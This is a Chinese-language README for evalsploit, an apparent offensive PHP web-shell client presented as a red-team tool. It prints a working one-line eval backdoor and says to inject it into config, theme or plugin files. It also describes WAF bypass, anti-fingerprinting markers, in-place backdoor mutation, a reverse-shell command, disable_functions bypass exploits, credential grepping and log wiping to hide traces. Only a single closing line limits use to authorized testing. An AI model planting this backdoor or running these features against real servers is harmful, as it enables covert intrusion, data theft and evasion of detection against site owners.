# evalsploit 3.1

> 基于 eval 的 PHP 后门客户端，用于红队与渗透测试。
> 在其他工具失效的地方照常工作 —— 没有 exec，没有 shell，没有问题。

**文档语言：** [English](README.md) | [Русский](README_RU.md) | **中文**

---

## 为什么选择 evalsploit

大多数 PHP 后门客户端假设你可以运行系统命令。而现实目标很少配合 —— `exec()`、`system()`、`shell_exec()` 等函数经常通过 `disable_functions` 被禁用。PHP 加固在共享主机、托管 WordPress 和注重安全的技术栈中十分常见。

evalsploit 正是为这类环境而生。所有文件操作仅使用 PHP 内置函数：`fopen`、`fread`、`fwrite`、`DirectoryIterator`、`copy`、`unlink`、`rename`。SQL 控制台使用 PDO。grep 和 find 使用 `RecursiveIteratorIterator`。无需 shell。

---

## 核心亮点

### 单行载荷，注入任意位置

```php
if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'],'',$_POST['Z'])));die();}
```

一行代码。放入任何可执行的 PHP 文件 —— 配置文件、主题文件、插件钩子。也可作为独立 shell 使用。触发键 `Z` 和噪声分隔符 `V` 可按会话配置。

### 兼容 PHP 8

Weevely 使用 `create_function`，该函数已在 PHP 8.0 中移除。evalsploit 在 PHP 5.6 至 8.x 上无需任何修改即可运行。

### 无 exec、无 shell —— 依然完全控制文件系统

所有文件操作通过 PHP 内置函数完成。即使在所有 exec 变体均被封锁的加固环境中，你仍可完整读写文件系统、列目录、递归搜索、下载、上传、就地编辑。

### 多态变异 —— 无需重新上传即可更换密钥

`mutate` 生成带有新随机密钥的后门，发送 PHP 将服务器上的后门行就地覆写，并将客户端切换到新密钥 —— 一条命令完成全部操作。无需重新上传，无需手动修改。

### 分块下载，支持大文件

标准后门客户端将整个文件读入 PHP 内存（受 `memory_limit` 限制，通常为 128 MB）。evalsploit 的分块下载使用 `fseek`/`fread` 通过多个请求以 1 MB 的块传输文件，并显示实时进度条：

```
  45.0 MB / 512.0 MB (8%)
```

切换方式：`set download chunked` / `set download dl`。

### 每次请求随机响应标记

后门输出在每次请求时都用随机生成的标记包裹。没有静态字符串可供 WAF 指纹识别或日志关联。每次请求看起来都不同。

### 3 种发送模式，内置 WAF 绕过

| 模式 | 工作原理 |
|------|---------|
| **bypass** | 载荷 base64 编码后分拆到两个 POST 参数（Z + 噪声分隔符 V），服务端重组。破坏模式匹配过滤器。 |
| **classic** | 完整 base64 载荷放在参数 Z 中。 |
| **simple** | 原始 PHP 放在参数 Z 中。用于调试或防护较弱的目标。 |

连接时自动检测：尝试所有模式，保存可用的那个。

### SQL 控制台 —— MySQL 和 PostgreSQL，无需独立插件

`sql user:pass@host/db` —— 一条命令通过 PDO 覆盖 MySQL 和 PostgreSQL。交互式 REPL，ASCII 表格在服务端格式化输出，`USE dbname` 无需额外请求即可处理。DSN 自动保存到会话。

### 递归 grep 和 find —— 无需 exec

```
grep -i "password" /var/www
find \.php$ /var/www/uploads
```

两者均在内部使用 PHP 迭代器。不需要 `grep` 或 `find` 可执行文件。

### 清除痕迹 —— clearlog

```
clearlog detect                              <- 查找所有可访问的日志文件，显示 [rw]/[r-] 状态
clearlog all /shell.php                      <- 从所有可写日志中删除匹配模式的行
clearlog /var/log/nginx/access.log 1.2.3.4   <- 单个文件，指定模式
```

默认模式为会话配置中的 URL 路径。

### 绕过 disable_functions —— 利用代码以数据形式传输

当文件操作还不够用时，`exploit` 将 PHP 利用代码（存储在本地 `exploits/` 中）直接通过后门的 eval 通道发送。覆盖 PHP 7.0 至 8.5。无需文件上传 —— 利用代码以 eval 数据形式到达。

### 插件 —— 无需修改核心即可扩展

在 `evalsploit/plugins/` 中放一个 `.py` 文件，使用 `@register("cmdname")`，下次运行时该命令即出现在会话中。核心文件无需改动。

### 代理轮换与实时验证

加载 `host:port` 代理列表，验证（通过每个代理进行实时 GET），每个会话使用随机或固定代理。无需重新连接即可在会话中切换代理。

---

## 安装

```bash
cd evalsploit
pip install -e .
# 或
pip install -r requirements.txt
```

数据（会话、设置、useragents）存放在 `data/` 目录。

---

## 运行

```bash
python -m evalsploit
# 或
evalsploit
```

启动菜单：输入**会话名**、**新 URL**，或按 Enter 使用上次的连接。

---

## 载荷

单行，注入任意可执行 PHP：

```php
if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'],'',$_POST['Z'])));die();}
```

更改发送模式或参数名后，运行 `gen` 获取对应载荷。

---

## 发送模式

| 模式 | 说明 |
|------|------|
| **bypass** | base64 载荷用分隔符分拆到两个参数 Z 和 V。可绕过部分 WAF。 |
| **classic** | base64 载荷放在参数 Z 中。 |
| **simple** | 原始 PHP 放在参数 Z 中。无标记解析 —— 用于调试。 |

连接时自动检测。手动设置：`set send bypass|classic|simple`。

---

## 命令

支持路径中含空格。两条路径时使用 ` : ` 作为分隔符（`cp`、`ren`/`mv`、带远程路径的 `upload`）。

| 命令 | 说明 |
|------|------|
| **ls**, **dir** | 列出目录（`set ls ls` 或 `set ls dir`） |
| **cd**, **pwd**, **home** | 切换目录 / 显示当前路径 / 转到 `__DIR__` |
| **cat** | 显示文件（`set cat bcat` / `set cat cat`） |
| **cp** | 复制：`cp <源> : <目标>` |
| **rm**, **del** | 删除（`set confirm 1` 时需确认） |
| **ren**, **mv** | 重命名/移动：`ren <旧> : <新>` |
| **download**, **get**, **dl** | 下载：`download <remote>` 或 `download <remote> : <local>`。支持分块模式（`set download chunked`）用于大文件，显示进度条。 |
| **upload**, **put**, **upl** | 上传：`upload <local>` 或 `upload <local> : <remote>` |
| **mkdir**, **mkd**, **md** | 创建目录 |
| **create**, **mkf** | 创建空文件 |
| **touch**, **stat** | 更新时间戳 / 文件信息 |
| **edit** | 下载 -> 本地编辑 -> 上传 |
| **grep** | 递归搜索文件内容：`grep [-i] <模式> [路径]`（PHP 正则） |
| **find** | 递归搜索文件名：`find <模式> [路径]`（PHP 正则，忽略大小写） |
| **clearlog** | 从日志文件删除匹配行：`clearlog detect` / `clearlog <path> [pattern]` / `clearlog all [pattern]`；默认模式为配置中的 URL 路径 |
| **run** | 交互式 shell（exec/shell_exec/...）—— `exit` 退出 |
| **php** | 交互式 PHP 控制台 —— 向服务器发送原始 PHP |
| **exploit** | 绕过 disable_functions（PHP 7.0–8.5） |
| **try**, **detect** | 检查可用的 exec 变体：`try run` |
| **reverse** | 反向 shell：`reverse <主机>:<端口>` |
| **sql** | SQL 控制台（PDO/MySQL/PostgreSQL）：`sql [user:pass@host[:port][/db]]`；连接成功后自动保存 DSN；`exit` 退出 |
| **scan** | 递归扫描，报告保存到 `report/` |
| **info** | 服务器信息：PHP 版本、OS、用户、`disable_functions`、`open_basedir` |
| **ping**, **check** | 连通性与延迟检测 |
| **gen**, **generate** | 显示当前 Z/V 和发送模式的载荷变体 |
| **mutate** | 用新多态载荷覆写服务器上的后门；更新本地 Z/V |
| **set** | 设置：`set <模块> <值>` 或 `set <模块> help` |
| **proxy_switch** | 切换代理：无参数（随机）、N（第 N 个）、random |
| **config** | 显示当前设置 |
| **sessions**, **saved** | 已保存会话列表 |
| **save \<名称\>** | 将当前连接保存为会话 |
| **connect \<名称\>** | 加载并切换到已保存会话 |
| **menu** | 返回启动菜单（结束当前会话） |
| **help**, **exit** | 帮助 / 退出（均提示确认） |

---

## 会话文件

存放在 `data/sessions/<名称>.ini`：

```ini
[SESSION]
url = https://target.com/shell.php
Z = mg1qjg
V = 3I15EA
send_mode = bypass
silent = 0
```

`save <名称>` 创建会话。`connect <名称>` 加载。`silent` 存储在会话文件中。

---

## 静默模式

`set silent 1` —— 连接时跳过初始 `pwd` 请求和发送模式检测。第一条命令即第一次请求。用于最小化流量特征。

全局保存，同时保存在会话文件中。

---

## 代理

启动菜单 -> **5. 代理**：从文件加载列表（`data/proxies.txt`，每行一个 `host:port`），验证（通过每个代理进行实时 GET），启用随机或固定模式。

会话内操作：
- `set proxy 0` / `set proxy 1` —— 禁用/启用
- `set proxy show` —— 列出已验证代理，按编号选择
- `set proxy switch` —— 切换到另一个随机代理
- `set proxy switch N` —— 切换到第 N 个代理
- `proxy_switch` —— 别名

---

## 设置（set）

| 设置 | 可选值 |
|------|--------|
| `set send` | `bypass`, `classic`, `simple` |
| `set run` | `exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`, `expect_popen`, `pcntl_exec`, `do` |
| `set ls` / `set cat` | 片段键（见 `snippets.ini`） |
| `set download` | `dl`（默认），`chunked`（大文件，显示进度条） |
| `set silent` | `0`, `1` |
| `set confirm` | `0`, `1` —— rm/upload/edit 前确认 |
| `set reverse` | `ivan`, `monkey` |
| `set grep` / `set find` | 片段键 |
| `set rm`, `set upload`, `set rename`, `set stat`, `set touch`, `set create`, `set mkdir`, `set cp` | 片段键（接受别名） |

`set <设置> help` 列出可用值。SQL DSN 在成功连接后自动保存。

---

## 代码片段（Snippets）

文件命令使用 `evalsploit/modules/snippets/` 中的 PHP 片段，在 `snippets.ini` 中建立索引。切换变体：`set <命令> <键>`。无效的键在加载时重置并给出警告。

值得注意的变体：
- `set download chunked` —— 每请求 1 MB 的分块下载，有进度条，不受 PHP memory_limit 限制
- `set ls dir` —— Windows 风格的目录列表
- `set cat bcat` —— 二进制安全的文件读取

---

## 变异（Mutation）

`mutate` 生成新的多态后门（新 Z、V），发送 PHP 在目标文件中定位含 `isset($_POST['Z'])` 的行，用新后门替换，并写回文件。客户端更新密钥。其他后门实例保留旧密钥。

---

## 插件

在 `evalsploit/plugins/` 中放一个 `.py` 文件。以 `_` 开头的文件会被跳过。

最简示例（`evalsploit/plugins/mycmd.py`）：

```python
from evalsploit.modules.registry import register
from evalsploit.modules.base import Module

@register("mycmd", description="简短说明", usage="mycmd [path]")
class MyCmdModule(Module):
    def run(self, ctx, args):
        print(ctx.send("echo getcwd();").strip())
        return None
```

`ctx.send(php)` —— 向服务器发送 PHP 并获取输出。
`ctx.resolve_path(path)` —— 相对于当前 pwd 解析路径。
`php_quote(s)` —— 转义字符串用于 PHP 单引号字面量。
`confirm_dangerous(ctx, action, detail)` —— 执行破坏性操作前提示确认。

更多内容见 `evalsploit/plugins/README.md` 和 `example_cwd.py`。

---

## 架构

```
evalsploit/
├── cli.py              — 启动菜单、会话循环、help
├── config.py           — 设置、会话加载/保存、片段键验证
├── context.py          — SessionContext：url、pwd、send()、路径辅助方法
├── transport/
│   ├── send.py         — HTTP POST、载荷编码、按标记解析响应
│   └── payloads.py     — 多态后门生成、变异用 PHP
├── modules/
│   ├── registry.py     — @register 装饰器、COMMANDS/COMMAND_HELP 字典
│   ├── base.py         — Module 基类、片段加载器、php_quote、substitute
│   ├── snippets/       — PHP 模板（ls、cat、dl、grep、find、sql...）
│   └── file/ set/ ...  — 命令模块
└── plugins/            — 用户插件（启动时自动加载）
exploits/               — PHP disable_functions 绕过载荷（通过 eval 通道发送）
data/                   — settings.ini、sessions/、proxies.txt、downloads/
```

---

## 与同类工具对比

### 功能矩阵

| 功能 | evalsploit | Weevely 3 | PhpSploit |
|------|------------|-----------|-----------|
| 兼容 PHP 8 | **是** | 否（`create_function` 已移除） | 是 |
| 无需 exec/shell | **是**（仅 PHP 内置） | 部分 | 部分 |
| 每请求随机标记 | **是** | 否（静态 MD5 标记） | 否 |
| 多态变异 | **是**（服务端就地覆写） | 否 | 否 |
| 静默模式 | **是** | 否 | 否 |
| 3 种发送模式（bypass/classic/simple） | **是** | 否 | 否 |
| SQL 控制台 | **是**（PDO，MySQL+PostgreSQL） | 是（mysqli/pg_*） | 是（每种 DBMS 独立插件） |
| 无需 exec 的递归 grep/find | **是** | 部分 | 否 |
| 分块下载（大文件） | **是**（1 MB/请求，显示进度） | 否 | 否 |
| 清除痕迹（clearlog） | **是**（插件） | 是 | 是 |
| 绕过 disable_functions | **是**（PHP 7.0–8.5） | 是 | 是 |
| 插件系统 | **是**（单个 .py 文件） | 是 | 是 |

### Weevely

Weevely 使用 XOR+gzip+base64 传输，每次部署的静态 MD5 标记使每个实例均可被识别。依赖 `create_function` 进行混淆 —— 该函数在 PHP 8.0 中已移除。evalsploit 每次请求使用随机标记，在 PHP 5.6–8.x 上均可运行，且文件操作无需 exec。

### PhpSploit

PhpSploit 是完整的 C2 框架，采用基于 HTTP 头的隧道传输，拥有插件系统，并为每种数据库提供独立的 SQL 模块。evalsploit 通过 PDO 的单条 `sql` 命令覆盖 MySQL 和 PostgreSQL。会话为简单的 `.ini` 文件。PhpSploit 没有静默模式和多态变异功能。

---

## 许可与使用

仅用于经授权的安全测试与研究。
